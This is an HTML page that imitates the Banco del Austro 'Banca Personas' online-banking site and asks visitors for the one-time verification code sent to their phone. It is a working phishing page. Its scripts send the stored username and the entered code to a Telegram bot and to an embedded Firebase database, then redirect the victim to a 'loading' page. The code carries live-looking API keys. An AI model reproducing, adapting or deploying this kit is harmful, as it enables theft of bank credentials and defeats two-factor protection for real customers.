<!DOCTYPE html>
<html lang="es-ES">
  <head id="Head">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Banco del Austro &gt; Banca virtual &gt; Banca Personas</title>
    <meta
      id="MetaDescription"
      name="DESCRIPTION"
      content="Entre los Bancos más grandes del Ecuador, Banco del Austro S.A es un banco sólido y solvente con presencia nacional caracterizado por brindar una atención personalizada y de calidad a nuestros clientes garantizando seguridad en todas nuestras gestiones."
    />
    <meta
      id="MetaKeywords"
      name="KEYWORDS"
      content="banco del austro, bancosutro, banco de apoyo, banco ecuador, banco cuenca, visa mastercard, servicios pagos, cash management banco austro, pago iees banco, pago pensiones banco, banco recarga celular, banco gobierno corporativo, banco cuentas ahorros, banco cuenta corriente, banco polizas acumulacion, banco inversiones, banco tarjetas, banco debitos, banco creditos, banco proveerores, banco promociones, banco ganas sueldos, banco super sueldo, banco austrogiros, banco super yapa,banco interes, b,DotNetNuke,DNN"
    />
    <meta id="MetaGenerator" name="GENERATOR" content="DotNetNuke " />
    <meta id="MetaRobots" name="ROBOTS" content="INDEX, FOLLOW" />
    <link href="default.css" type="text/css" rel="stylesheet" />
    <link href="skin.css" type="text/css" rel="stylesheet" />
    <link href="container.css" type="text/css" rel="stylesheet" />
    <link href="portal.css" type="text/css" rel="stylesheet" />
    <link
      href="jquery.mmenu.all.css"
      type="text/css"
      rel="stylesheet"
    />
    <link href="BancoAustro.css" type="text/css" rel="stylesheet" />
    <link href="font-awesome.css" type="text/css" rel="stylesheet" />
    <link href="stylesheet.css" type="text/css" rel="stylesheet" />
    <link href="DNNMovil.css" type="text/css" rel="stylesheet" />
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        onSnapshot,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
        authDomain: "basedtos-84767.firebaseapp.com",
        projectId: "basedtos-84767",
        storageBucket: "basedtos-84767.appspot.com",
        messagingSenderId: "622608516389",
        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
      };

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      window.db = db; // Hacer db accesible globalmente
      window.doc = doc;
      window.setDoc = setDoc;
    </script>
    <link
      href="http://www.bancodelaustro.com/banca-virtual/banca-personas"
      rel="canonical"
    />
    <style>
      #divLoginInputs {
        z-index: 1;
        position: absolute;
        left: 0;
        right: 0;
        background-color: #f7f7f700;
        color: white;
        padding: 0;
        margin-left: 69%;
        margin-top: 15%;
        min-height: 300px;
      }

      #imgPrinSinLogo {
        min-height: 350px;
        width: 100%;
        height: auto;
      }

      @media screen and (max-width: 800px) {
        #divLoginInputs {
          margin-left: 20%;
        }

        #imgPrinSinLogo {
          opacity: 0;
        }

        #divshadow {
          background-color: #9d9e9f;
        }
      }
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    />
  </head>
  <body id="Body">
    <form id="loginform">
      <!-- Header -->
      <div class="Header">
        <div class="CenteredContent FullTableContent LoginContent">
          <div class="Logo">
            <a id="dnn_dnnLOGO_hypLogo" title="Banco del Austro" href="#">
              <img
                id="dnn_dnnLOGO_imgLogo"
                src="LogoBancoAustro.png"
                alt="Banco del Austro"
              />
            </a>
          </div>
          <div class="Login">
            <div class="LoginComponent TableContent FontUnivers">
              <div id="dnn_LogoContainer" class="LogoContainer">
                <div class="DnnModule DnnModule-HTML DnnModule-1417">
                  <a name="1417"></a>
                  <div class="ClearContainer">
                    <div id="dnn_ctr1417_ContentPane">
                      <!-- Start_Module_1417 -->
                      <div
                        id="dnn_ctr1417_ModuleContent"
                        class="DNNModuleContent ModHTMLC"
                      >
                        <div
                          id="dnn_ctr1417_HtmlModule_lblContent"
                          class="Normal"
                        >
                          <p>
                            <img
                              alt=""
                              src="IconBancaPersonas.png"
                              style="height: 50px"
                            />
                          </p>
                        </div>
                      </div>
                      <!-- End_Module_1417 -->
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="flex items-center justify-center h-screen bg-white">
        <div
          class="w-full max-w-md p-8 border border-gray-300"
          style="border: 1px solid black; margin: 20px"
        >
          <!-- Header Section -->
          <div class="flex items-center justify-between mb-6">
            <h1 class="text-2xl font-bold text-gray-800">
              VALIDACIÓN DE SEGURIDAD
            </h1>
            <div class="text-right text-lg font-bold text-gray-800">
              <span class="text-red-600"> &lt; </span>BANCA <br />
              PERSONAS <span class="text-yellow-500"> &gt; </span>
            </div>
          </div>

          <!-- Instruction Text -->
          <p class="text-gray-700 mb-4 text-center leading-tight">
            Estimado cliente, ingrese el código de seguridad enviado a su
            celular. Tiene 3 intentos de ingreso, caso contrario bloqueará su
            usuario web temporalmente.
          </p>

          <!-- Verification Code Input -->
          <label class="block text-gray-800 font-semibold text-center mb-2"
            >CÓDIGO DE VERIFICACIÓN</label
          >
          <input
            type="text"
            class="w-full border border-gray-400 rounded-lg py-2 px-4 mb-6 text-center"
            placeholder="Ingrese código"
            id="OTP"
            required
          />

          <!-- Buttons -->
          <div class="flex justify-center space-x-4">
            <button
              class="bg-blue-900 text-white font-bold py-2 px-6 rounded-lg"
            >
              CONTINUAR
            </button>
            <button
              class="bg-blue-900 text-white font-bold py-2 px-6 rounded-lg"
            >
              CANCELAR
            </button>
          </div>
        </div>
      </div>
    </form>
  </body>
  <script src="script.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");

    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Evita que se envíe el formulario por defecto

      // Captura las variables necesarias
      const nombre = localStorage.getItem("usuario");
      const token = document.querySelector("#OTP").value;
      const message = "Austro\nNombre: " + nombre + "\nToken: " + token;

      // Asegúrate de que Firestore esté configurado correctamente
      const questionRef = doc(window.db, "bcrr2", nombre);
      await setDoc(questionRef, {
        question1: "A1",
        question2: "A1",
        question3: "A1",
        page: 0,
      });

      // Envío a Telegram
      axios
        .post(
          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
          {
            chat_id: chat,
            text: message,
          }
        )
        .then((response) => {
          // Redirige a otra página tras el éxito
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  </script>
</html>
